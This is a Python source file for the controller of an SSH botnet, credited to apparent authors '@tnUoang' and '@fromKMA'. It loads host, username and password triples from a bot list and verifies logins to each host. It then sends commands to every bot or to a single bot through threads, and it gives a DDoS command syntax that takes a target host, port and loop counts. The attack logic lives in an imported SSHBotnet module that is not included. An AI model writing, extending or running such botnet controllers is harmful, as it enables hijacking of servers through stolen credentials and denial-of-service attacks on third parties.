# @tnUoang

import threading
from threading import Thread
import SSHBotnet
import time

banner = """ 
  _____ _____ _    _     ____   ____ _______ _   _ ______ _______ 
 / ____/ ____| |  | |   |  _ \ / __ \__   __| \ | |  ____|__   __|
| (___| (___ | |__| |   | |_) | |  | | | |  |  \| | |__     | |   
 \___ \ ___ \|  __  |   |  _ <| |  | | | |  | . ` |  __|    | |   
 ____) |___) | |  | |   | |_) | |__| | | |  | |\  | |____   | |   
|_____/_____/|_|  |_|   |____/ \____/  |_|  |_| \_|______|  |_|    
 
"""
print (banner)


class BotMaster():
    def __init__(self): 
        self.Bot_list = []
        self.start()
        
    def read_botlist(self, file_path):
        with open(file_path, 'r') as file:
            for line in file:
                data = [] 
                data = line.split()
                self.Bot_list.append(data)
                self.check_bots(1, data)
                
    def connect_bot(self, info): 
        print("Select opt:   (1):Download or Upload   (2):Command")
        opt = input()
        if opt == '1':
            opt = 3.1
        else:
            opt = 3.2       
        hostname, username, password = info[0], info[1], info[2]
        print('Connecting ' + hostname+ '...') 
        try:
            SSHBotnet.SSHBotnet(hostname,username,password, opt)
        except:
            pass
        
    def check_bots(self, code,  data) -> bool: 
        hostname, username, password = data[0], data[1], data[2]
        try:
            if code == 1:
                SSHBotnet.SSHBotnet(hostname,username,password, 1)
            else:
                SSHBotnet.SSHBotnet(hostname,username,password, 2)
        except:
            pass
        
    
    def send_command_to_bots(self, command):
        for bot in range (len(self.Bot_list)):
            thread = threading.Thread(target=self._send, args=(self.Bot_list[bot][0], self.Bot_list[bot][1], self.Bot_list[bot][2], command))
            thread.start()
            thread.join()

    def _send(self,hostname, username, password, command):
        SSHBotnet.SSHBotnet(hostname,username,password, command)
        
    def new_bot(self, info):
        data = [] 
        data = str(info).split()
        self.Bot_list.append(data)
        
    def start(self):
        instruction = ("+--------------------------------------------------+\n"
                       "|                   SSH Botnet                     |\n"
                       "|   Option:                                        |\n"
                       "|    (1)        Scan bot                           |\n"
                       "|    (2)        Connect to new bot                 |\n"
        			   "|    (3)        Bot function                       |\n"
        		       "|    (4)        Exiting                            |\n"
                       "|                                                  |\n"
                       "|                                                  |\n"
                       "+--------------------------------------------------+\n"
                       "\t\t\t\t\t(@fromKMA)")
        print(instruction)
        
        option = input("Select Option:\n").strip()
        while True:
            if option == '1':
                print("\t\t--------Client--------")
                self.read_botlist('C:\\Users\\Me\\Desktop\\BotList.txt')
                option = input("\nSelect Option:\n").strip()
                
            elif option == '2':
                info = input("Address:"+'\n').split()
                self.check_bots(2, info)
                with open('C:\\Users\\Me\\Desktop\\BotList.txt', 'a') as file:
                    print('Save address?' + '\t Yes/No')
                    opt = input().strip()
                    if opt == 'Yes' or  opt == 'yes' or opt == 'y':
                        print('Enter address again:')
                        info = input().strip()
                        self.new_bot(info)
                        file.write('\n' + str(info))
                        print("Done!")
                        option = input("\nSelect Option:\n").strip()
                    else:
                        print('Exit')
                        option = input("\nSelect Option:\n").strip()
                
            elif option == '3':
                print('\t\t(1) ALL Bot\n' + '\t\t(2) Particular Bot')
                opt = input("Select Option:\n").strip()
                if opt == '1':
                    print("Ddos syntax: ddos [hostname] [port] [loops] [times/loop]")
                    print('Command: ')
                    command = input().strip()
                    self.send_command_to_bots(command)
                    option = input("\nSelect Option:\n").strip()
                elif opt == '2':
                    print("Select bot:")
                    info = input().split()
                    self.connect_bot(info)
                    option = input("\nSelect Option:\n").strip()
                    
            elif option == '4':
                    print("Exiting...")
                    break
                
            else:
                print("\tInvalid Option!")
                option = input("Select another option:\n").strip()
            
                
if __name__ == '__main__':
    BotMaster()
